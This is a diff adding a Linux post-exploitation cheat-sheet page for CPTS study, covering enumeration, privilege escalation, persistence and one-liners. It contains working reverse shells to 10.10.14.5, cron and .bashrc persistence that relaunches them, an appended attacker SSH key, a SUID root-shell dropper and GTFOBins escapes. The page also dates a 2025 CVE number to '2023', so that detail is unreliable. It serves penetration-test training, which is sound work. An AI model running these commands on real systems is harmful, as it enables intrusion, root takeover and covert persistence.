@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Linux | Paracausal Telemetry</title>
+    <meta name="description" content="An interactive Linux post-exploitation reference: local enumeration, privilege escalation (sudo and GTFOBins, SUID/SGID, capabilities, writable cron, PATH abuse, kernel exploit suggesters), persistence, and the handy one-liners, for authorised testing." />
+    <meta name="robots" content="index,follow" />
+    <meta name="theme-color" content="#0a0b0c" />
+    <meta name="referrer" content="strict-origin-when-cross-origin" />
+    <link rel="canonical" href="https://paracausaltelemetry.com/cpts/linux/" />
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="Paracausal Telemetry" />
+    <meta property="og:title" content="Linux" />
+    <meta property="og:description" content="An interactive Linux post-exploitation reference: local enumeration, privilege escalation (sudo and GTFOBins, SUID/SGID, capabilities, writable cron, PATH abuse, kernel exploit suggesters), persistence, and the handy one-liners, for authorised testing." />
+    <meta property="og:url" content="https://paracausaltelemetry.com/cpts/linux/" />
+    <meta property="og:image" content="https://paracausaltelemetry.com/src/social-preview.png?v=17f992b5" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:image" content="https://paracausaltelemetry.com/src/social-preview.png?v=17f992b5" />
+    <link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" />
+    <link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin />
+    <link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin />
+    <link rel="stylesheet" href="/styles.css?v=276fa973-site9" />
+    <link rel="stylesheet" href="/cpts/password-cracking/pc-map.css?v=pc1" />
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Linux quick ops: local enumeration, privilege escalation, persistence and one-liners","description":"An interactive Linux post-exploitation reference: local enumeration, privilege escalation (sudo and GTFOBins, SUID/SGID, capabilities, writable cron, PATH abuse, kernel exploit suggesters), persistence, and the handy one-liners, for authorised testing.","url":"https://paracausaltelemetry.com/cpts/linux/","isPartOf":{"@type":"CollectionPage","name":"CPTS","url":"https://paracausaltelemetry.com/cpts/"}}</script>
+  </head>
+  <body>
+    <script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script>
+    <a class="skip-to-content" href="#pc-main">Skip to the content</a>
+    <div class="page-shell">
+      <header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">CPTS</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/">Writeups</a><a href="/cpts/" aria-current="page">CPTS</a><a href="/links/">Links</a><a href="/talks/">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header>
+      <main id="pc-main" class="pc-main">
+        <nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/cpts/">CPTS</a><span>/</span><span aria-current="page">Linux</span></nav>
+        <section class="page-hero">
+          <div class="page-hero-card">
+            <canvas class="hero-dither" aria-hidden="true"></canvas>
+            <div class="page-hero-copy">
+              <p class="eyebrow">CPTS &middot; Linux quick ops</p>
+              <h1>Linux<span class="signal-stop">.</span></h1>
+              <p>A grab-bag reference for working a Linux foothold: enumerate the host and your own context, hunt the usual local privilege-escalation paths (SUID/SGID, sudo rules, capabilities, cron, PATH), establish persistence, and keep the handy one-liners close. Open any node for what it means and the commands behind it. Everything here is for systems you are authorised to test: enumeration is quiet, but privilege escalation and persistence change the host and are logged, so stay inside scope and keep notes.</p>
+              <p class="pc-hero-link"><a href="/cpts/">Full command reference on the CPTS page</a></p>
+            </div>
+          </div>
+        </section>
+        <section class="pc-map" aria-labelledby="pc-map-title">
+          <div class="pc-map-head">
+            <h2 id="pc-map-title">Linux quick ops, mapped</h2>
+            <div class="pc-map-tools" hidden>
+              <button class="pc-tool-btn" type="button" data-expand="open">Open all</button>
+              <button class="pc-tool-btn" type="button" data-expand="close">Close all</button>
+            </div>
+          </div>
+          <ol class="pc-spine">
+          <li class="pc-phase" id="pcphase-enum">
+            <header class="pc-phase-head">
+              <span class="pc-phase-num">01</span>
+              <h2 class="pc-phase-title" id="pcphase-enum-title">Local enumeration</h2>
+              <p class="pc-phase-blurb">Learn who you are, what you can run, and what the host exposes before touching anything. All read-only, all as a standard user.</p>
+            </header>
+            <ul class="pc-tree pc-tree-root">
+              <li class="pc-node is-console" id="pcnode-en-id">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Your context (id / sudo -l)</span></summary>
+                  <div class="pc-node-body"><p>id prints your UID, GID and groups: membership of sudo, wheel, docker, lxd, adm or disk is a lead in itself (docker and lxd group members can trivially become root). sudo -l lists what you may run through sudo and as whom, the single most valuable privesc check, because a single misconfigured rule (NOPASSWD on an abusable binary) is often the whole path. hostnamectl and uname -a give the kernel and distro.</p><pre class="pc-cmd"><code>id
+whoami
+sudo -l
+uname -a
+hostnamectl
+cat /etc/os-release</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-en-users">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Users &amp; home dirs</span></summary>
+                  <div class="pc-node-body"><p>/etc/passwd lists every account, its shell and home directory; a world-readable /etc/shadow is an instant win (crack the hashes). Comb the home directories and /tmp, /var and web roots for keys, config and history files. The dot-files (.bash_history, .ssh, .aws, .config) are where credentials hide.</p><pre class="pc-cmd"><code>cat /etc/passwd
+ls -la /etc/shadow
+ls -la /home/*
+cat ~/.bash_history
+find / -name &#39;id_rsa*&#39; -o -name &#39;*.pem&#39; 2&gt;/dev/null</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-en-network">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Network (ss / ip)</span></summary>
+                  <div class="pc-node-body"><p>ss -tulpn (or netstat -tulpn) lists listening sockets with the owning process: services bound to 127.0.0.1 are reachable only from the host, prime pivot targets. ip a and ip route map the interfaces and routes; arp -a and /etc/hosts name neighbours. A service on localhost that runs as root is often the easiest escalation on the box.</p><pre class="pc-cmd"><code>ss -tulpn
+ip a
+ip route
+cat /etc/hosts
+arp -a</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-en-processes">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Processes &amp; software</span></summary>
+                  <div class="pc-node-body"><p>ps aux shows every process and its owner, revealing root-owned services and any credential passed on a command line. Note the installed package versions (dpkg -l / rpm -qa) and the service list for known-vulnerable software. pspy (no root needed) watches processes and cron jobs over time to catch short-lived root tasks you would otherwise miss.</p><pre class="pc-cmd"><code>ps aux
+ps auxf
+dpkg -l 2&gt;/dev/null | head
+systemctl list-units --type=service --state=running
+./pspy64</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-en-cron">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Scheduled jobs (cron)</span></summary>
+                  <div class="pc-node-body"><p>List your own crontab and read the system ones: /etc/crontab, /etc/cron.d and the cron.daily/hourly directories. A root cron job that runs a script you can write to, or uses a relative path or a wildcard, is a direct escalation. If you cannot read a job, pspy will show it executing.</p><pre class="pc-cmd"><code>crontab -l
+cat /etc/crontab
+ls -la /etc/cron.*
+cat /etc/cron.d/*</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-en-scanners">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Automated scanners</span></summary>
+                  <div class="pc-node-body"><p>linPEAS is the broad enumerator: it checks SUID/SGID, sudo, capabilities, cron, writable files, kernel version and known exploits, colour-coding the likely wins. LinEnum and linux-smart-enumeration (lse.sh) cover the same ground more quietly. Run one for breadth, then verify each flagged path by hand, the scanner suggests, you confirm.</p><pre class="pc-cmd"><code>./linpeas.sh
+./LinEnum.sh
+./lse.sh -l1</code></pre></div>
+                </details>
+              </li>
+            </ul>
+            <a class="pc-next" href="#pcphase-privesc" data-to="privesc"><span aria-hidden="true">&#8595;</span> Proceed to Privilege escalation</a>
+          </li>
+          <li class="pc-phase" id="pcphase-privesc">
+            <header class="pc-phase-head">
+              <span class="pc-phase-num">02</span>
+              <h2 class="pc-phase-title" id="pcphase-privesc-title">Privilege escalation</h2>
+              <p class="pc-phase-blurb">From a standard user to root. Walk the common paths in roughly decreasing order of reliability: sudo rules, SUID/SGID, capabilities, writable cron, PATH abuse, then a kernel exploit as a last resort.</p>
+            </header>
+            <ul class="pc-tree pc-tree-root">
+              <li class="pc-node is-console has-kids" id="pcnode-pe-sudo">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Sudo rules + GTFOBins</span></summary>
+                  <div class="pc-node-body"><p>sudo -l is where most Linux escalations start. Any binary you may run as root through sudo is a candidate: look it up on GTFOBins for the &#39;sudo&#39; escape that spawns a shell or reads a protected file. Even seemingly harmless tools (find, vim, less, awk, tar, env, python) have a documented escape. Watch for NOPASSWD entries and for env_keep settings (LD_PRELOAD / LD_LIBRARY_PATH with SETENV let you load a malicious library as root).</p><pre class="pc-cmd"><code>sudo -l
+sudo find . -exec /bin/sh \; -quit
+sudo vim -c &#39;:!/bin/sh&#39;
+sudo awk &#39;BEGIN {system(&quot;/bin/sh&quot;)}&#39;</code></pre></div>
+                </details>
+                <ul class="pc-tree">
+                <li class="pc-node is-console" id="pcnode-pe-sudo-cve">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">Sudo version CVEs</span></summary>
+                    <div class="pc-node-body"><p>The sudo binary itself has had serious bugs: Baron Samedit (CVE-2021-3156), a heap overflow exploitable by any local user regardless of sudoers, and the 2023 chroot flaw (CVE-2025-32463 on recent versions). Check the version against known CVEs before assuming you need a sudoers rule at all.</p><pre class="pc-cmd"><code>sudo --version | head -1</code></pre></div>
+                  </details>
+                </li></ul>
+              </li>
+              <li class="pc-node is-console has-kids" id="pcnode-pe-suid">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">SUID / SGID binaries</span></summary>
+                  <div class="pc-node-body"><p>A SUID binary runs with the file owner&#39;s privileges (root), whoever executes it, so an abusable root-owned SUID is a shell. Find them with find and the -perm mask, then check each against GTFOBins for the &#39;SUID&#39; entry. Custom or unusual SUID binaries are the most promising: a company-built helper rarely drops privileges correctly. SGID (-2000) is the group equivalent.</p><pre class="pc-cmd"><code>find / -perm -4000 -type f 2&gt;/dev/null
+find / -perm -2000 -type f 2&gt;/dev/null
+find / -perm -u=s -type f -exec ls -la {} \; 2&gt;/dev/null</code></pre></div>
+                </details>
+                <ul class="pc-tree">
+                <li class="pc-node" id="pcnode-pe-suid-gtfo">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">GTFOBins SUID escapes</span></summary>
+                    <div class="pc-node-body"><p>The common wins, each on GTFOBins: a SUID find runs find . -exec /bin/sh -p \; (the -p keeps the elevated privileges), a SUID bash needs bash -p, and nmap, vim, less, cp, env and dozens more have documented SUID escapes. The GTFOBins reference examples are in the table below. If a binary is not a known one, search its name plus &#39;SUID privilege escalation&#39;.</p><pre class="pc-cmd"><code>/usr/bin/find . -exec /bin/sh -p \; -quit
+/path/to/suid/bash -p</code></pre></div>
+                  </details>
+                </li></ul>
+              </li>
+              <li class="pc-node is-console" id="pcnode-pe-caps">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Capabilities (getcap)</span></summary>
+                  <div class="pc-node-body"><p>Linux capabilities split root&#39;s power into units a binary can hold without being full SUID. getcap -r / lists every file with capabilities. cap_setuid+ep on an interpreter (python, perl, ruby) is as good as root: the program can set its UID to 0 itself. cap_dac_read_search reads any file; cap_dac_override writes any file. Check each capability against GTFOBins&#39; &#39;Capabilities&#39; entry.</p><pre class="pc-cmd"><code>getcap -r / 2&gt;/dev/null
+/usr/bin/python3 -c &#39;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#39;</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-pe-cron">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Writable cron / scripts</span></summary>
+                  <div class="pc-node-body"><p>A root cron job that executes a script you can write to runs your code as root on its next tick. Find world-writable files and directories, cross-reference with the cron jobs, and look for jobs that call a script by a relative path or expand a wildcard (tar/rsync wildcard injection). Append a reverse shell or a chmod +s /bin/bash to the script and wait for the schedule.</p><pre class="pc-cmd"><code>find / -writable -type f 2&gt;/dev/null | grep -v &#39;/proc/&#39;
+ls -la /etc/cron.d /etc/cron.daily
+echo &#39;cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash&#39; &gt;&gt; /path/to/writable/cronscript.sh</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-pe-path">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">PATH abuse</span></summary>
+                  <div class="pc-node-body"><p>When a root-run script or SUID binary calls another program by name instead of an absolute path (service, cat, ps), the shell resolves it through PATH. If you can prepend a directory you control to PATH, your malicious binary of that name runs as root. Classic against a SUID wrapper that shells out: create a fake &#39;service&#39; in /tmp, put /tmp first in PATH, run the wrapper.</p><pre class="pc-cmd"><code>echo $PATH
+cd /tmp; echo &#39;/bin/bash -p&#39; &gt; service; chmod +x service; export PATH=/tmp:$PATH
+/path/to/suid-wrapper</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console has-kids" id="pcnode-pe-kernel">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Kernel &amp; exploit suggesters</span></summary>
+                  <div class="pc-node-body"><p>If configuration yields nothing, the kernel version may. linux-exploit-suggester (les.sh) and linux-exploit-suggester-2 compare uname -a against a database of kernel CVEs and rank candidates (DirtyCow, DirtyPipe, OverlayFS, pwnkit). Kernel exploits can panic the host, so treat them as a last resort and prefer a stable, well-documented one on an authorised test.</p><pre class="pc-cmd"><code>uname -a
+./les.sh
+./linux-exploit-suggester-2.pl</code></pre></div>
+                </details>
+                <ul class="pc-tree">
+                <li class="pc-node" id="pcnode-pe-pwnkit">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">pwnkit / DirtyPipe</span></summary>
+                    <div class="pc-node-body"><p>Two near-universal local roots worth knowing: pwnkit (CVE-2021-4034) abuses pkexec&#39;s argument handling and hits almost every distro from 2009 onward; DirtyPipe (CVE-2022-0847) overwrites read-only files via a pipe-buffer flaw on kernels 5.8 to 5.16.11. Both have reliable public exploits; confirm the pkexec version and kernel before running.</p><pre class="pc-cmd"><code>ls -la /usr/bin/pkexec
+uname -r</code></pre></div>
+                  </details>
+                </li></ul>
+              </li>
+            </ul>
+            <a class="pc-next" href="#pcphase-persist" data-to="persist"><span aria-hidden="true">&#8595;</span> Proceed to Persistence</a>
+          </li>
+          <li class="pc-phase" id="pcphase-persist">
+            <header class="pc-phase-head">
+              <span class="pc-phase-num">03</span>
+              <h2 class="pc-phase-title" id="pcphase-persist-title">Persistence</h2>
+              <p class="pc-phase-blurb">Survive a reboot or a dropped session. On an authorised test, record every mechanism you add so it can be removed in the clean-up.</p>
+            </header>
+            <ul class="pc-tree pc-tree-root">
+              <li class="pc-node is-console" id="pcnode-ps-ssh">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">SSH authorized_keys</span></summary>
+                  <div class="pc-node-body"><p>The quietest foothold: append your public key to a user&#39;s ~/.ssh/authorized_keys and you can log in as them over SSH with no password, as long as the key stays. Root&#39;s authorized_keys gives passwordless root. Needs write access to the target user&#39;s .ssh (you already have it for your own user). Remove the line during clean-up.</p><pre class="pc-cmd"><code>mkdir -p ~/.ssh &amp;&amp; chmod 700 ~/.ssh
+echo &#39;ssh-ed25519 AAAA... attacker&#39; &gt;&gt; ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-ps-cron">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Cron job</span></summary>
+                  <div class="pc-node-body"><p>A cron entry re-launches a reverse shell on a schedule. A user crontab (crontab -e) needs no root and fires as that user; a line in /etc/cron.d or a root crontab fires as root. Keep the interval modest and the command plausible. List and remove with the same tool.</p><pre class="pc-cmd"><code>(crontab -l 2&gt;/dev/null; echo &#39;*/10 * * * * /bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.5/443 0&gt;&amp;1&quot;&#39;) | crontab -
+crontab -l</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-ps-systemd">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">systemd unit / timer</span></summary>
+                  <div class="pc-node-body"><p>A systemd service that restarts on failure, or a timer, is durable persistence. A unit in /etc/systemd/system runs as root (needs root to write); a user unit under ~/.config/systemd/user runs as you with lingering enabled. Enable it so it starts at boot. More robust than cron but more visible to an admin reviewing units.</p><pre class="pc-cmd"><code>systemctl list-unit-files --type=service
+systemctl enable --now evil.service
+systemctl --user enable --now evil.service</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-ps-shellrc">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Shell startup files</span></summary>
+                  <div class="pc-node-body"><p>A line in ~/.bashrc, ~/.profile or /etc/profile.d/ runs every time that user opens a shell, no scheduler needed. Useful to re-trigger a payload on the next interactive login. Quiet, but only fires on login, so pair it with another mechanism. Record the exact line you added.</p><pre class="pc-cmd"><code>echo &#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.5/443 0&gt;&amp;1&quot; &amp;&#39; &gt;&gt; ~/.bashrc
+ls -la /etc/profile.d/</code></pre></div>
+                </details>
+              </li>
+            </ul>
+          </li>
+          <li class="pc-phase" id="pcphase-oneliners">
+            <header class="pc-phase-head">
+              <span class="pc-phase-num">04</span>
+              <h2 class="pc-phase-title" id="pcphase-oneliners-title">Handy one-liners</h2>
+              <p class="pc-phase-blurb">The commands you reach for again and again: spawning a proper shell, transferring files, and upgrading a dumb shell to an interactive one.</p>
+            </header>
+            <ul class="pc-tree pc-tree-root">
+              <li class="pc-node is-console" id="pcnode-ol-tty">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Upgrade to a TTY</span></summary>
+                  <div class="pc-node-body"><p>A raw reverse shell has no job control, no tab completion and dies on Ctrl-C. Upgrade it: spawn a PTY with Python, then background it and set the terminal to raw so you get a full interactive shell with history and arrow keys. The stty rows/cols step makes full-screen tools (vim, less) render correctly.</p><pre class="pc-cmd"><code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+export TERM=xterm
+[Ctrl-Z] then: stty raw -echo; fg
+stty rows 38 cols 116</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-ol-revshell">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Reverse shells</span></summary>
+                  <div class="pc-node-body"><p>When you have command execution and want a shell back. bash /dev/tcp is built in and needs nothing extra; nc with -e (or the mkfifo variant where -e is stripped) and a Python one-liner cover the rest. Start a listener (nc -lvnp 443) on your host first. The attacker IP here is a placeholder.</p><pre class="pc-cmd"><code>bash -i &gt;&amp; /dev/tcp/10.10.14.5/443 0&gt;&amp;1
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.5 443 &gt;/tmp/f
+python3 -c &#39;import socket,subprocess,os;s=socket.socket();s.connect((&quot;10.10.14.5&quot;,443));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#39;</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-ol-transfer">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">File transfer</span></summary>
+                  <div class="pc-node-body"><p>Move tooling onto the box or loot off it. Serve a directory from your host with Python&#39;s HTTP server, then pull with wget or curl. scp works when you have SSH. For a quick paste, base64 the file and decode it on the far side. The host here is the attacker&#39;s HTTP server.</p><pre class="pc-cmd"><code>python3 -m http.server 80
+wget http://HOST/linpeas.sh -O /tmp/linpeas.sh
+curl http://HOST/linpeas.sh -o /tmp/linpeas.sh
+base64 -w0 file | xclip  # then: echo &lt;b64&gt; | base64 -d &gt; file</code></pre></div>
+                </details>
+              </li>
+              <li class="pc-node is-console" id="pcnode-ol-find">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Find interesting files</span></summary>
+                  <div class="pc-node-body"><p>Sweep the filesystem for the things that matter: world-writable files and directories, files owned by root that you can write, recently modified files, and credentials in config. Redirect stderr to /dev/null to cut the permission-denied noise.</p><pre class="pc-cmd"><code>find / -writable -type d 2&gt;/dev/null
+find / -user root -perm -o+w -type f 2&gt;/dev/null
+find / -name &#39;*.conf&#39; -exec grep -l -i &#39;password&#39; {} \; 2&gt;/dev/null
+grep -riE &#39;password|api_key|secret&#39; /var/www 2&gt;/dev/null</code></pre></div>
+                </details>
+              </li>
+            </ul>
+          </li>
+          </ol>
+        </section>
+        <section class="pc-ref" id="pcref-suid-finds" aria-labelledby="pcref-suid-finds-title">
+          <div class="pc-ref-head">
+            <h2 id="pcref-suid-finds-title">Privilege-escalation find commands</h2>
+            <p class="pc-ref-intro">The find invocations that surface each local privesc primitive. Run them early; cross-reference the results with GTFOBins. Filter by target.</p>
+          </div>
+          <div class="pc-ref-search" role="search">
+            <label class="pc-ref-label" for="pcref-suid-finds-q">Filter privilege-escalation find commands</label>
+            <input class="tool-input pc-ref-input" id="pcref-suid-finds-q" type="search" autocomplete="off" placeholder="raw-md5, ntlm, zip&hellip;" data-ref-filter="suid-finds" />
+            <span class="pc-ref-count" data-ref-count="suid-finds" aria-live="polite"></span>
+          </div>
+          <div class="pc-ref-wrap">
+            <table class="pc-ref-table" data-ref-table="suid-finds">
+              <thead><tr><th scope="col">Target</th><th scope="col">Command</th></tr></thead>
+              <tbody>
+                <tr data-search="suid binaries find / -perm -4000 -type f 2&gt;/dev/null"><td>SUID binaries</td><td><code>find / -perm -4000 -type f 2&gt;/dev/null</code></td></tr>
+                <tr data-search="sgid binaries find / -perm -2000 -type f 2&gt;/dev/null"><td>SGID binaries</td><td><code>find / -perm -2000 -type f 2&gt;/dev/null</code></td></tr>
+                <tr data-search="capabilities getcap -r / 2&gt;/dev/null"><td>Capabilities</td><td><code>getcap -r / 2&gt;/dev/null</code></td></tr>
+                <tr data-search="world-writable files find / -writable -type f 2&gt;/dev/null"><td>World-writable files</td><td><code>find / -writable -type f 2&gt;/dev/null</code></td></tr>
+                <tr data-search="world-writable dirs find / -writable -type d 2&gt;/dev/null"><td>World-writable dirs</td><td><code>find / -writable -type d 2&gt;/dev/null</code></td></tr>
+                <tr data-search="root-owned, group/other-writable find / -user root -perm -o+w -type f 2&gt;/dev/null"><td>Root-owned, group/other-writable</td><td><code>find / -user root -perm -o+w -type f 2&gt;/dev/null</code></td></tr>
+                <tr data-search="private keys find / -name &#39;id_rsa*&#39; -o -name &#39;*.pem&#39; 2&gt;/dev/null"><td>Private keys</td><td><code>find / -name &#39;id_rsa*&#39; -o -name &#39;*.pem&#39; 2&gt;/dev/null</code></td></tr>
+                <tr data-search="readable shadow ls -la /etc/shadow"><td>Readable shadow</td><td><code>ls -la /etc/shadow</code></td></tr>
+              </tbody>
+            </table>
+            <p class="pc-ref-empty" data-ref-empty="suid-finds" hidden>No match. Try a format name, a value, or clear the filter.</p>
+          </div>
+        </section>
+        <section class="pc-ref" id="pcref-gtfobins" aria-labelledby="pcref-gtfobins-title">
+          <div class="pc-ref-head">
+            <h2 id="pcref-gtfobins-title">GTFOBins escapes (common)</h2>
+            <p class="pc-ref-intro">A sample of GTFOBins shell escapes. Check the specific function (sudo, SUID, capabilities) for whichever binary sudo -l or the SUID search surfaced. Filter by binary.</p>
+          </div>
+          <div class="pc-ref-search" role="search">
+            <label class="pc-ref-label" for="pcref-gtfobins-q">Filter gtfobins escapes (common)</label>
+            <input class="tool-input pc-ref-input" id="pcref-gtfobins-q" type="search" autocomplete="off" placeholder="raw-md5, ntlm, zip&hellip;" data-ref-filter="gtfobins" />
+            <span class="pc-ref-count" data-ref-count="gtfobins" aria-live="polite"></span>
+          </div>
+          <div class="pc-ref-wrap">
+            <table class="pc-ref-table" data-ref-table="gtfobins">
+              <thead><tr><th scope="col">Binary</th><th scope="col">sudo / SUID escape</th></tr></thead>
+              <tbody>
+                <tr data-search="find find . -exec /bin/sh -p \; -quit"><td><code>find</code></td><td><code>find . -exec /bin/sh -p \; -quit</code></td></tr>
+                <tr data-search="vim vim -c &#39;:!/bin/sh&#39;  (sudo) / :py3 import os;os.execl(&#39;/bin/sh&#39;,&#39;sh&#39;,&#39;-pc&#39;,&#39;reset; exec sh -p&#39;)"><td><code>vim</code></td><td><code>vim -c &#39;:!/bin/sh&#39;  (sudo) / :py3 import os;os.execl(&#39;/bin/sh&#39;,&#39;sh&#39;,&#39;-pc&#39;,&#39;reset; exec sh -p&#39;)</code></td></tr>
+                <tr data-search="awk awk &#39;begin {system(&quot;/bin/sh&quot;)}&#39;"><td><code>awk</code></td><td><code>awk &#39;BEGIN {system(&quot;/bin/sh&quot;)}&#39;</code></td></tr>
+                <tr data-search="less less /etc/profile then !/bin/sh"><td><code>less</code></td><td><code>less /etc/profile then !/bin/sh</code></td></tr>
+                <tr data-search="env env /bin/sh -p"><td><code>env</code></td><td><code>env /bin/sh -p</code></td></tr>
+                <tr data-search="python3 python3 -c &#39;import os;os.setuid(0);os.system(&quot;/bin/sh&quot;)&#39;"><td><code>python3</code></td><td><code>python3 -c &#39;import os;os.setuid(0);os.system(&quot;/bin/sh&quot;)&#39;</code></td></tr>
+                <tr data-search="tar tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"><td><code>tar</code></td><td><code>tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code></td></tr>
+                <tr data-search="nmap nmap --interactive then !sh  (legacy) / --script with os.execute"><td><code>nmap</code></td><td><code>nmap --interactive then !sh  (legacy) / --script with os.execute</code></td></tr>
+                <tr data-search="cp cp --no-preserve=mode /bin/sh over a writable root file (write primitive)"><td><code>cp</code></td><td><code>cp --no-preserve=mode /bin/sh over a writable root file (write primitive)</code></td></tr>
+              </tbody>
+            </table>
